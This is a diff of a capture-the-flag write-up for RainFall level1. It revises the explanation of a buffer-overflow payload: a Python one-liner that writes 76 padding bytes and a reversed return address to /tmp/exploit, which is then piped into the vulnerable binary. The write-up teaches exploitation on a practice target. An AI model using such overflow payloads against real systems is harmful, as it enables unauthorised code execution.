@@ -50,7 +50,7 @@ Now we can create a string to send to the program that will contain the memory a
 ~~~bash
 level1@RainFall:~$ python -c 'print "42" * 38 + "\x08\x04\x84\x44"[::-1]' > /tmp/exploit
 ~~~
-Prints 76 bytes + mem address using little endian as proper format (python will reverse bytes using[::-1]) into the file.
+Runs the command in python (-c), printing 76 bytes + mem address using little endian as proper format (python will reverse bytes using[::-1], printing it as a little endian) into the file. On most x86 and x86-64 architectures, memory is organized in little-endian format. When you work with memory addresses directly, such as when you're exploiting a buffer overflow, you need to respect this byte order to ensure that the program interprets the address correctly.
 ~~~bash
 level1@RainFall:~$ cat /tmp/exploit - | ./level1
 ~~~
